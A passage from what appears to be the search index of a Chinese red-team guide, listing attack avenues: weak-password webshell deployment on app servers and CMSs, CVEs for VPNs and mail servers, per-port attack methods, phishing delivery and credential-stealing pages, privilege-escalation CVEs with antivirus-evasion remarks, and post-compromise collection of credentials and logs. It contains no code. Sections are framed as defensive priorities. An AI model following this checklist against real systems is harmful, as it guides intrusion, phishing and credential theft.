\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell wildfly [ jboss 7.x \u6539\u540d\u4e3a wildfly ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Tomcat CVE-2016-8735 CVE-2017-12615 [ readonly \u5b9e\u9645\u8bbe\u4e3a true\u7684\u60c5\u51b5\u8f83\u5c11,\u7a0d\u9e21\u808b ] CVE-2020-1938 [ AJP\u534f\u8bae\u6f0f\u6d1e,\u76f4\u63a5\u628a8009\u7aef\u53e3\u66b4\u9732\u5728\u5916\u7f51\u7684\u4e0d\u592a\u591a,\u7a0d\u9e21\u808b ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshelll [ \u6ce8: 7.x\u7248\u672c\u540e,\u9ed8\u8ba4\u52a0\u4e86\u9632\u7206\u673a\u5236 ] Jekins CVE-2018-1999002 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u4efb\u610f\u547d\u4ee4\u6267\u884c \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u4efb\u610f\u547d\u4ee4\u6267\u884c ElasticSearch CVE-2014-3120 [\u4e13\u95e8\u9488\u5bf9\u8001\u7248\u672c(\u65e0\u6c99\u76d2)RCE] CVE-2015-1427 [Groovy RCE] CVE-2015-3337 [\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6] \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 RabbitMQ \u5f31\u53e3\u4ee4 Glassfish \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 [ \u4f4e\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell IBM Websphere Java \u53cd\u5e8f\u5217\u5316 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u90e8\u7f72webshell Axis2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u76ee\u5f55\u904d\u5386 Apache ActiveMQ \u672a\u6388\u6743\u8bbf\u95ee,5.12 \u4e4b\u524d\u7684\u7248\u672c fileserver\u5b58\u5728 PUT\u4efb\u610f\u5199 CVE-2015-5254 Apache Solr CVE-2017-12629 CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ] Apache Zookeeper \u672a\u6388\u6743\u8bbf\u95ee,\u654f\u611f\u4fe1\u606f\u6cc4\u9732 Apache Shiro\u53cd\u5e8f\u5217\u5316 fastjson <= 1.2.47 \u53cd\u5e8f\u5217\u5316\u5229\u7528 \u9488\u5bf9\u5404\u7c7bWindows php\u96c6\u6210\u73af\u5883 [ \u7531\u4e8e\u6b64\u7c7b\u73af\u5883\u62ff\u5230\u7684Webshell\u6743\u9650\u76f8\u5bf9\u8f83\u9ad8,\u6240\u4ee5,\u901a\u5e38\u4e5f\u662f\u7ea2\u961f\u4eba\u5458\u7684\u9996\u9009\u7a81\u7834\u53e3 ] AppServ Xampp \u5b9d\u5854 PhpStudy ...... \u9488\u5bf9\u5404\u7c7b\u5f00\u6e90\u7a0b\u5e8f\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 Dedecms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 thinkphp 5.x \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ecshop \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 Metinfo \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 discuz \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 \u5e1d\u56fdcms \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 phpmyadmin \u6570\u636e\u5e93\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 wordpress \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 joomla \u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 drupal CVE-2018-7600 ,\u540e\u53f0\u5f31\u53e3\u4ee4,\u7cfb\u5217\u5df2\u77e5nday\u6f0f\u6d1e\u5229\u7528 ...... \u9488\u5bf9\u5176\u5b83\u5404\u7c7bWeb\u7ec4\u4ef6\u7684 \u5df2\u77e5Nday\u6f0f\u6d1e\u5229\u7528 IIS 6.0 RCE \u77ed\u6587\u4ef6\u6f0f\u6d1e PUT \u4efb\u610f\u5199 Webdav RCE CVE-2017-7269 \u7985\u9053\u9879\u76ee\u7ba1\u7406\u7cfb\u7edf SQL\u6ce8\u5165 \u6587\u4ef6\u8bfb\u53d6 \u8fdc\u7a0b\u6267\u884c \u901a\u8fbeOA SQL\u6ce8\u5165 \u4efb\u610f\u4e0a\u4f20 Exchange \u5229\u7528\u63a5\u53e3\u8fdb\u884c\u90ae\u7bb1\u7528\u6237\u540d\u679a\u4e3e \u9488\u5bf9\u5404\u4e2a\u63a5\u53e3\u7684\u5f31\u53e3\u4ee4\u7206\u7834 CVE-2020-0688 [ \u5229\u7528\u524d\u63d0\u662f\u9700\u8981\u5148\u5f97\u6709\u4efb\u610f\u4e00\u4e2a\u90ae\u7bb1\u7528\u6237\u6743\u9650 ] .... Zimbra [ XXE + SSRF => RCE ] CVE-2013-7091 CVE-2016-9924 CVE-2019-9670 Citrix CVE-2019-19781 Jumpserver \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 Zabbix CVE-2017-2824 SQL\u6ce8\u5165 [ 2.0 \u8001\u7248\u672c ] \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4,\u654f\u611f\u673a\u5668\u4fe1\u606f\u6cc4\u9732 Cacti \u4f4e\u7248\u672c SQL\u6ce8\u5165 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Nagios CVE-2016-9565 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 Webmin RCE CVE-2019-15107 PHPMailer CVE-2016-10033 \u6cdb\u5faeOA\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u91d1\u8776OA SQL\u6ce8\u5165 Coremail \u654f\u611f\u6587\u4ef6\u6cc4\u9732 UEditor \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 OpenSSL\u5fc3\u810f\u6ef4\u8840\u6293\u660e\u6587\u8d26\u53f7\u5bc6\u7801 [ Heartbleed ] \u7834\u58f3\u6f0f\u6d1e [ Shellshock ] \u5404\u79cd\u80fd\u5feb\u901fgetshell\u7684\u5e38\u89c4\u57fa\u7840Web\u6f0f\u6d1e\u5229\u7528 [ \u6ce8: \u6709\u4e9b\u6f0f\u6d1e\u5728\u4e0d\u5ba1\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u5176\u5b9e\u662f\u5f88\u96be\u6709\u6548\u76f2\u6d4b\u5230\u7684 ] \u540e\u53f0\u5f31\u53e3\u4ee4 SSRF sql\u6ce8\u5165 \u8d8a\u6743 \u547d\u4ee4 / \u4ee3\u7801\u6267\u884c / \u53cd\u5e8f\u5217\u5316 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 / \u4e0b\u8f7d / \u8bfb\u53d6 \u5305\u542b XSS\uff08\u5b9e\u9645\u4e0a,XSS\u53ea\u6709\u5728\u9488\u5bf9\u67d0\u4e9b\u7279\u5b9a\u90ae\u7bb1,\u624b\u91cc\u6709\u6d4f\u89c8\u56680day\u65f6\u4ef7\u503c\u624d\u4f1a\u6bd4\u8f83\u5927,\u7ea2\u961f\u573a\u666f\u4e0b\u5176\u5b9e\u5e76\u4e0d\u662f\u975e\u5e38\u81f4\u547d) \u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e \u9488\u5bf9\u5404\u7c7b\u8fb9\u754c\u7f51\u7edc\u8bbe\u5907\u7684\u5404\u79cd\u5229\u7528,\u4e3b\u8981\u662fWeb\u7ba1\u7406\u63a7\u5236\u53f0\u767b\u5f55\u5f31\u53e3\u4ee4\u53ca \u5404\u7c7b\u5df2\u77e5nday\u653b\u51fb\u5229\u7528 Pulse Secure VPN CVE-2019-11510 [ \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 ] Fortinet VPN CVE-2018-13379 [ \u6587\u4ef6\u8bfb\u53d6 ] Sangfor Vpn RCE","title":"0x02 \u5165\u53e3\u6743\u9650\u83b7\u53d6[ \u5916\u90e8\u9632\u5fa1\u91cd\u5fc3 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x03-getshell","text":"\u6b64\u5904\u4ec5\u4ec5\u53ea\u6311\u9009\u4e86\u4e00\u4e9b\u5b9e\u6218\u4e2d\u771f\u6b63\u80fd\u534f\u52a9\u5feb\u901fgetshell\u7684\u670d\u52a1,\u5176\u5b83\u7684\u4e00\u4e9b\u76f8\u5bf9\u8fb9\u7f18\u6027\u7684\u670d\u52a1\u5747\u672a\u63d0\u53ca,\u540c\u6837,\u5df2\u6309 \"\u5b9e\u9645\u653b\u51fb\u5229\u7528\u7684\u96be\u6613\u7a0b\u5ea6\" \u53ca \"\u83b7\u53d6\u5230\u7684shell\u6743\u9650\u9ad8\u4f4e\"\u4e3a\u6807\u51c6\u8fdb\u884c\u4e86\u8be6\u7ec6\u6392\u5e8f\u5982\u4e0b,\u5c31\u6bcf\u4e2a\u7aef\u53e3\u7684\u5177\u4f53\u653b\u51fb\u5229\u7528\u65b9\u5f0f,\u8fdb\u884c\u4e86\u7b80\u8981\u8bf4\u660e Top Port List Mssql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1433\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] SMB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 445\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 135\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] WinRM [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5985\u7aef\u53e3,\u6b64\u9879\u4e3b\u8981\u9488\u5bf9\u67d0\u4e9b\u9ad8\u7248\u672cWindows, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] RDP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3389\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u522b\u4eba\u7559\u7684shift\u7c7b\u540e\u95e8 ] SSH [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 22\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] ORACLE [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1521\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743, \u8fdc\u7a0b\u6267\u884c, \u540e\u95e8\u690d\u5165 ] Mysql [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3306\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732, \u63d0\u6743(\u53ea\u9002\u7528\u4e8e\u90e8\u5206\u8001\u7cfb\u7edf) ] REDIS [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 6379\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u672a\u6388\u6743\u8bbf\u95ee, \u5199\u6587\u4ef6(webshell,\u542f\u52a8\u9879,\u8ba1\u5212\u4efb\u52a1), \u63d0\u6743 ] POSTGRESQL[ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5432\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] LDAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 389\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee, \u5f31\u53e3\u4ee4, \u654f\u611f\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732 ] SMTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 25\u7aef\u53e3, \u670d\u52a1\u9519\u8bef\u914d\u7f6e\u5bfc\u81f4\u7684\u7528\u6237\u540d\u679a\u4e3e\u6f0f\u6d1e, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] POP3 [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 110\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] IMAP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 143\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Exchange [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 443\u7aef\u53e3, \u63a5\u53e3\u5f31\u53e3\u4ee4\u7206\u7834 eg: Owa,ews,oab,AutoDiscover... pth\u8131\u90ae\u4ef6, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ... ] VNC [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5900\u7aef\u53e3, \u5f31\u53e3\u4ee4 ] FTP [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 21\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u533f\u540d\u8bbf\u95ee/\u53ef\u5199, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Rsync [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 873\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] Mongodb [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 27017\u7aef\u53e3, \u672a\u6388\u6743, \u5f31\u53e3\u4ee4 ] TELNET [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 23\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u540e\u95e8\u690d\u5165 ] SVN [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 3690\u7aef\u53e3, \u5f31\u53e3\u4ee4, \u654f\u611f\u4fe1\u606f\u6cc4\u9732 ] JAVA RMI [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 1099\u7aef\u53e3, \u53ef\u80fd\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u5229\u7528 ] CouchDB [ \u9ed8\u8ba4\u5de5\u4f5c\u5728tcp 5984\u7aef\u53e3, \u672a\u6388\u6743\u8bbf\u95ee ]","title":"0x03 \u5165\u53e3\u6743\u9650\u83b7\u53d6[\u4e13\u95e8\u9488\u5bf9\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u7aef\u53e3\u7684\u5404\u79cdgetshell\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" )]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x04","text":"\u4f20\u7edf\u9493\u9c7c\u653b\u51fb\u5229\u7528\uff0c\u5b9e\u9645\u62a4\u7f51\u573a\u666f\u4e2d\u7528\u7684\u975e\u5e38\u9891\u7e41\uff0c\u7ec6\u8282\u975e\u5e38\u591a\uff0c\u6b64\u5904\u4e0d\u4e00\u4e00\u5217\u4e3e\uff0c\u9632\u5fa1\u91cd\u70b9 \u53d1\u4fe1\u524d\u671f\u51c6\u5907 \u679a\u4e3e\u6709\u6548\u7684\u76ee\u6807\u90ae\u7bb1\u7528\u6237\u540d\u5217\u8868 \u6279\u91cf\u63a2\u6d4b\u76ee\u6807\u90ae\u7bb1\u5f31\u53e3\u4ee4 \u4f2a\u9020\u53d1\u4fe1\u4eba [ \u53d1\u4fe1\u90ae\u670d\u642d\u5efa ] \u9493\u9c7c\u4fe1 [ \u9488\u5bf9\u4e0d\u540c\u884c\u4e1a\u4e00\u822c\u4e5f\u90fd\u4f1a\u4e8b\u5148\u51c6\u5907\u597d\u5404\u79cd\u5404\u6837\u7684\u9488\u5bf9\u6027\u7684\u53d1\u4fe1\u8bdd\u672f\u6a21\u677f,\u4ee5\u6b64\u6765\u63d0\u5230\u5b9e\u9645\u53d1\u4fe1\u6210\u529f\u7387 ] ...... \u5178\u578b\u6295\u9012\u65b9\u5f0f \u7b2c\u4e00\u79cd,\u76f4\u63a5\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u5e38\u89c4\u6728\u9a6c\u4fe1 \u4f20\u7edf\u5b8f\u5229\u7528 \u6346\u7ed1 exe[zip,7z] lnk chm \u81ea\u89e3\u538b \u6728\u9a6c\u94fe\u63a5 OLE CVE-2017-11882 [ \u5229\u7528\u6f0f\u6d1e\u89e6\u53d1 ] ... \u7b2c\u4e8c\u79cd,\u7ed9\u76ee\u6807\u53d1\u9001\u5404\u79cd\u9493\u9c7c\u94fe\u63a5,\u6bd4\u5982, \u5229\u7528\u5404\u79cd\u76ee\u6807\u767b\u5f55\u53e3\u7684\u9493\u9c7c\u9875\u9762\u6765\u7a83\u53d6\u5404\u79cd\u5185\u7f51\u8d26\u53f7\u5bc6\u7801 Vpn Mail OA Net ntlm hash [ \u8fdc\u7a0b\u6a21\u677f\u6ce8\u5165,pdf...\u9493hash,\u56fd\u5185ISP\u8fc7\u6ee4SMB\u6d41\u91cf\u4e0d\u9002\u7528 ] ......","title":"0x04 \u5165\u53e3\u6743\u9650\u83b7\u53d6"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x05","text":"\u4ee5\u4e0b\u53ea\u5355\u72ec\u6311\u4e86\u4e00\u4e9b\u5728 \u901a\u7528\u6027, \u7a33\u5b9a\u6027, \u6613\u7528\u6027, \u5b9e\u9645\u6210\u529f\u7387\u90fd\u76f8\u5bf9\u8f83\u597d\u7684\u6d1e\u548c\u65b9\u5f0f,\u5176\u5b83\u7684\u4e00\u4e9b\"\u8fb9\u7f18\u6027\"\u7684\u5229\u7528\u90fd\u6682\u672a\u63d0\u53ca Windows \u7cfb\u7edf\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ \u6210\u529f\u7684\u524d\u63d0\u662f,\u4fdd\u8bc1\u4e8b\u5148\u5df2\u505a\u597d\u5404\u79cd\u9488\u5bf9\u6027\u514d\u6740 ] BypassUAC [ win7 / 8 / 8.1 / 10 ] MS14-058[KB3000061] [\u91cd\u70b9] MS14-068[KB3011780] [\u91cd\u70b9] ms15-051[KB3045171] [\u91cd\u70b9] MS15-077[KB3077657] [\u91cd\u70b9] MS16-032[KB3124280] [\u91cd\u70b9] ms16-075 [\u91cd\u70b9] MS16-135[KB3199135] [\u91cd\u70b9] MS17-010[KB4013389] [\u91cd\u70b9] cve-2019-0708 [\u91cd\u70b9] CVE-2019-0803 [\u91cd\u70b9] CVE-2019-1322 & CVE-2019-1405 [\u91cd\u70b9] cve-2019-12750 [ \u8d5b\u95e8\u94c1\u514b(\u7528\u7684\u8f83\u591a)\u672c\u5730\u63d0\u6743 ] [\u91cd\u70b9] linux \u5185\u6838\u6f0f\u6d1e \u672c\u5730\u63d0\u6743 [ linux-exploit-suggester ] CVE-2016-5195 [\u91cd\u70b9] CVE-2017-16995 CVE-2019-13272 \u5229\u7528\u5404\u7c7b\u7b2c\u4e09\u65b9\u670d\u52a1 / \u8f6f\u4ef6\u5de5\u5177\u63d0\u6743 Mssql [\u91cd\u70b9] Oracle [\u91cd\u70b9] Mysql \u5404\u7c7b\u7b2c\u4e09\u65b9\u8f6f\u4ef6dll\u52ab\u6301 [\u91cd\u70b9] suid\u6743\u9650 \u8ba1\u5212\u4efb\u52a1 \u5404\u79cd\u9519\u8bef\u670d\u52a1\u914d\u7f6e\u5229\u7528","title":"0x05 \u4e3b\u673a\u5b89\u5168 [ \u63d0\u6743\u5229\u7528\uff0c\u9632\u5fa1\u91cd\u70b9 ]"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/#0x06","text":"\u641c\u96c6\u5f53\u524d\u5df2\u63a7\"\u8df3\u677f\u673a\"\u7684\u5404\u7c7b\u654f\u611f\u4fe1\u606f \u6ce8: \u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684,\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 \u67e5\u770b\u5f53\u524dshell\u6743\u9650 \u53ca \u8be6\u7ec6\u7cfb\u7edf\u5185\u6838\u7248\u672c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684 \u8be6\u7ec6ip\u914d\u7f6e,\u5305\u62ec \u6240\u5728\u57df, ip, \u63a9\u7801, \u7f51\u5173, \u4e3b\u5907 dns ip \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6700\u8fd1\u7684\u7528\u6237\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u6240\u6709\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55 [ \u4e3b\u8981\u9488\u5bf9linux,\u91cc\u9762\u53ef\u80fd\u5305\u542b\u7684\u6709\u5404\u7c7b\u654f\u611f\u8d26\u53f7\u5bc6\u7801,ip,\u654f\u611f\u670d\u52a1\u914d\u7f6e... ] \u83b7\u53d6\u672c\u673a\u6240\u6709 \u670d\u52a1/\u8fdb\u7a0b [\u5305\u62ec\u5404\u4e2a\u8fdb\u7a0b\u7684\u8be6\u7ec6\u6743\u9650,\u4e5f\u5305\u62ec\u76ee\u6807\u7cfb\u7edf\u4e2d\u7684\u53ef\u7591\u6076\u610f\u8fdb\u7a0b(\u6709\u53ef\u80fd\u662f\u540c\u884c\u7684\u9a6c)]/\u7aef\u53e3/\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f \u83b7\u53d6\u672c\u673a\u6240\u7528\u6740\u8f6f / \u76d1\u63a7\u79cd\u7c7b [ \u540e\u7eed\u597d\u9488\u5bf9\u6027\u7684\u505a\u514d\u6740 ] \u83b7\u53d6\u672c\u673a rdp / ssh \u7aef\u53e3\u5f00\u542f\u72b6\u6001 \u53ca \u5176\u9ed8\u8ba4\u7aef\u53e3\u53f7 \u83b7\u53d6\u672c\u673a\u6240\u6709\u7528\u6237\u7684rdp\u5916\u8fde\u8bb0\u5f55 \u83b7\u53d6\u672c\u673a\u7684\u6240\u6709SSH\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u767b\u5f55\u6210\u529f\u7684\u65e5\u5fd7 [ \u9488\u5bf9windows ] \u83b7\u53d6\u672c\u673a\u6240\u6709\u5df2\u5b89\u88c5\u8f6f\u4ef6\u7684\u8be6\u7ec6\u5217\u8868 [ \u4e3b\u8981\u4e3a\u6293\u5bc6\u7801,\u63d0\u6743,\u7559\u540e\u95e8\u505a\u51c6\u5907 ] \u83b7\u53d6\u672c\u673a\u5404\u4e2a\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684 \u6240\u6709\u4e66\u7b7e\u9875 \u53ca \u5386\u53f2\u6d4f\u89c8\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u521b\u5efa\u7684\u6240\u6709\u8ba1\u5212\u4efb\u52a1\u5217\u8868 \u53ca \u8ba1\u5212\u4efb\u52a1\u6240\u5bf9\u5e94\u7684\u6267\u884c\u811a\u672c\u5185\u5bb9 [ \u6709\u4e9b\u6267\u884c\u811a\u672c\u4e2d\u5f88\u53ef\u80fd\u5b58\u7684\u6709\u5404\u79cd\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 ] \u83b7\u53d6\u5f53\u524d\u7528\u6237 \u684c\u9762 \u53ca \u56de\u6536\u7ad9 \u91cc\u7684\u6240\u6709\u6587\u4ef6\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u5b58\u5728suid\u6743\u9650\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4ee3\u7406 [ ip & \u7aef\u53e3 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u7684\u81ea\u542f\u52a8\u6ce8\u518c\u8868\u9879\u503c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 ipc \u8fde\u63a5 \u53ca \u5df2\u542f\u7528\u5171\u4eab \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u6302\u8f7d[mount] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u9632\u706b\u5899\u72b6\u6001 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u5206\u533a/\u76d8\u7b26\u53ca\u5176\u8be6\u7ec6\u4f7f\u7528\u60c5\u51b5 \u83b7\u53d6\u672c\u673a\u7684\u7d2f\u8ba1\u5f00\u673a\u65f6\u957f \u83b7\u53d6\u672c\u673aarp / dns\u7f13\u5b58 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u73af\u5883\u53d8\u91cf [ \u4e3b\u8981\u60f3\u770b\u770b\u76ee\u6807\u673a\u5668\u4e0a\u6709\u65e0python,jdk,ruby...\u7b49\u8bed\u8a00\u7684\u6267\u884c\u73af\u5883,\u540e\u671f\u53ef\u8bbe\u6cd5\u5229\u7528 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u672c\u5730\u7528\u6237\u53ca\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edfhost\u6587\u4ef6\u5185\u5bb9 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u786c\u4ef6\u8bbe\u5907\u4fe1\u606f[ \u4e3b\u8981\u4e3a\u5224\u65ad\u5f53\u524d\u673a\u5668\u662f\u5426\u4e3a\u865a\u62df\u673a ] \u8fdc\u7a0b\u622a\u5c4f\u6355\u6349\u76ee\u6807\u7528\u6237\u654f\u611f\u64cd\u4f5c \u7531\u4e8e\u4e0a\u8ff0\u5927\u90e8\u5206\u7684\u641c\u96c6\u52a8\u4f5c\u90fd\u662f\u57fa\u4e8e\u7cfb\u7edf\u5185\u7f6e\u5de5\u5177\u548c\u63a5\u53e3,\u6545,\u53ef\u5b8c\u5168\u4f9d\u9760EDR\u6765\u5b9e\u65f6\u6355\u6349\u5404\u7c7b\u654f\u611f\u8fdb\u7a0b\u4e0a\u62a5\u6076\u610f\u64cd\u4f5c \u5229\u7528\u5f53\u524d\u5df2\u63a7 \"\u8df3\u677f\u673a\", \u5206\u6790\u76ee\u6807\u5185\u7f51\u5927\u81f4\u7f51\u7edc\u62d3\u6251\u53ca\u6240\u6709\u5173\u952e\u6027\u4e1a\u52a1\u673a\u5668\u5206\u5e03 \u6279\u91cf\u6293\u53d6\u5185\u7f51\u6240\u6709windows\u673a\u5668\u540d \u548c \u6240\u5728 \"\u57df\" / \"\u5de5\u4f5c\u7ec4\u540d\" [smb\u63a2\u6d4b\u626b\u63cf] \u9488\u5bf9\u5185\u7f51\u7684\u5404\u79cd\u9ad8\u5371\u654f\u611f\u670d\u52a1\u5b9a\u4f4d[\"\u5b89\u5168\" \u7aef\u53e3\u626b\u63cf (\u5728\u907f\u514d\u5bf9\u65b9\u9632\u62a4\u62a5\u8b66\u62e6\u622a\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5404\u79cd\u5e38\u89c4\u670d\u52a1\u63a2\u6d4b\u8bc6\u522b)] \u5185\u7f51\u6279\u91cf Web Banner \u6293\u53d6,\u83b7\u53d6\u5173\u952e\u76ee\u6807\u4e1a\u52a1\u7cfb\u7edf\u5982\u4e0b \u5185\u7f51\u5404\u79cd\u6587\u4ef6[\u5171\u4eab]\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bweb\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51\u5404\u7c7b\u6570\u636e\u5e93\u670d\u52a1\u5668 \u5185\u7f51\u90ae\u4ef6\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51Vpn\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] 